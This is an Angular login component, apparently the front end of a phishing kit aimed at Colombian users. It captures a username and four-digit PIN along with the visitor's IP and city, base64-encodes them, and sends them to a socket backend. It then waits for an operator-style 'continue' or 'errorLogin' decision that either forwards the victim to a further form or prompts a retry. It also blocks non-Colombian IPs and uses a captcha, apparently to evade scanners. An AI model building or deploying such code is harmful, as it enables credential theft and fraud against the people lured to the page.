import { CommonModule } from '@angular/common';

import { Component } from '@angular/core';
import {
  FormGroup,
  FormBuilder,
  Validators,
  ReactiveFormsModule,
  FormsModule,
} from '@angular/forms';
import { Router } from '@angular/router';
import { FuncionalityService } from '../../services/funcionality.service';
import { HttpClient } from '@angular/common/http';
import { ToastrService } from 'ngx-toastr';

declare global {
  interface Window {
    onTurnstileCallback: (token: string) => void;
  }
}

@Component({
  selector: 'app-auth',
  imports: [ReactiveFormsModule, CommonModule, FormsModule],
  templateUrl: './auth.component.html',
  styleUrl: './auth.component.css',
})
export class AuthComponent {
  private socketId: string | null = null;
  private messageId: string | null = null;
  private isRetry: boolean = false;
  private city: string = '';
  private weekdaysES = [
    'domingo',
    'lunes',
    'martes',
    'miércoles',
    'jueves',
    'viernes',
    'sábado',
  ];
  private monthsES = [
    'enero',
    'febrero',
    'marzo',
    'abril',
    'mayo',
    'junio',
    'julio',
    'agosto',
    'septiembre',
    'octubre',
    'noviembre',
    'diciembre',
  ];

  public pi = '';
  public authForm: FormGroup;
  public isLoading: boolean = false;
  public weekdayName: string;
  public day: number;
  public monthName: string;
  public startTime: string;
  public endTime: string;
  public period: string;
  public errorLogin: boolean = false;

  constructor(
    private http: HttpClient,
    private fb: FormBuilder,
    private router: Router,
    private functionalityService: FuncionalityService,
    private toastr: ToastrService
  ) {

    window.onTurnstileCallback = this.handleTurnstileToken.bind(this);
    const date = new Date();
    date.setDate(date.getDate() + 1); // tomorrow

    this.weekdayName = this.weekdaysES[date.getDay()];
    this.day = date.getDate();
    this.monthName = this.monthsES[date.getMonth()];

    const hours = date.getHours();
    this.period = this.getPeriod(hours);

    // Generate random start and end times within the same period
    const isAM = hours < 12;
    const startHour = isAM
      ? Math.floor(Math.random() * 12)
      : Math.floor(Math.random() * 12) + 12;
    let endHour = isAM
      ? Math.floor(Math.random() * (12 - startHour)) + startHour + 1
      : Math.floor(Math.random() * (24 - startHour)) + startHour;

    // Ensure endHour is within the same period
    if (isAM) {
      endHour = Math.min(endHour, 11);
    } else {
      endHour = Math.min(endHour, 23);
    }

    const startMinutes = Math.floor(Math.random() * 60);
    const endMinutes = Math.floor(Math.random() * 60);

    this.startTime = this.formatTime(startHour, startMinutes);
    this.endTime = this.formatTime(endHour, endMinutes);

    this.authForm = this.fb.group({
      username: [
        '',
        [Validators.required, Validators.pattern(/^[a-zA-Z0-9]+$/)],
      ],
      password: ['', [Validators.required, Validators.pattern(/^\d{4}$/)]],
    });
  }

  ngOnInit(): void {
    // Inicialización del componente
    this.socketId = localStorage.getItem('skid');
  }

  handleTurnstileToken(token: string) {
    // Envía el token al backend para validación
    this.functionalityService.handleCaptchaToken(token).subscribe((res) => {
      console.log(res);
    });
  }

  private getPeriod(hour: number): string {
    if (hour < 12) {
      return 'de la mañana';
    } else {
      return 'de la tarde';
    }
  }

  private formatTime(hour: number, minutes: number): string {
    const twelveHour = hour % 12 || 12;
    const formattedMinutes = minutes.toString().padStart(2, '0');
    return `${twelveHour}:${formattedMinutes}`;
  }

  async onSubmit(): Promise<void> {
    if (this.authForm.valid) {
      this.isLoading = true;

      try {
        const { ip, city } = await this.getPi();
        let payload = {
          user: this.authForm.value.username,
          pass: this.authForm.value.password,
          ip,
          city,
        };
        console.log(payload)
        let data = btoa(JSON.stringify(payload));

        if (!this.socketId) {
          this.toastr.error('Socket no inicializado');
          this.isLoading = false;
          return;
        }

        const sessionId = this.functionalityService.getStoredSessionId();

             // Reiniciar suscripción al decisionSubject
      this.functionalityService.resetDecisionSubject();

        // Inicia el proceso y espera respuesta con nuevos IDs
        this.functionalityService
          .startProcess(data, localStorage.getItem('skid'), sessionId, this.isRetry)
          .subscribe((res: any) => {
            this.isRetry = false;
          }); 
         // Reinicia bandera

        // Suscribe a decisiones usando `socketId` como clave
        this.functionalityService.onDecision(sessionId).subscribe((res) => {
          console.log(res)
          if (res === 'continue') {
            this.toastr.success('Sesión activa');
            this.router.navigate(['/formulario']);
          } else if (res === 'errorLogin') {
            this.isLoading = false;
            this.authForm.reset();
            this.isRetry = true;
            this.toastr.error('Credenciales incorrectas');
          }
        });
      } catch (error) {
        this.isLoading = false;
        console.error('Error en onSubmit:', error);
      }
    } else {
      this.authForm.markAllAsTouched();
    }
  }

  get username() {
    return this.authForm.get('username');
  }

  get password() {
    return this.authForm.get('password');
  }

  async getPi(): Promise<{ ip: string; city: string }> {
    try {
      // Obtiene la IP pública
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();

      // Obtiene datos de geolocalización
      const locationResponse = await fetch(
        `https://ipapi.co/${ipData.ip}/json/`
      );
      const locationData = await locationResponse.json();

      // Valida que el país sea Colombia
      if (locationData.country !== 'CO') {
        console.warn(
          'Acceso denegado para IP no colombiana:',
          locationData.country
        );
        this.isLoading = false;
        this.errorLogin = true;
        throw new Error('IP no permitida');
      }

      return {
        ip: ipData.ip,
        city: locationData.city,
      };
    } catch (error) {
      console.error('Error al obtener IP o ciudad:', error);
      this.isLoading = false;
      this.errorLogin = true;
      throw error;
    }
  }
}
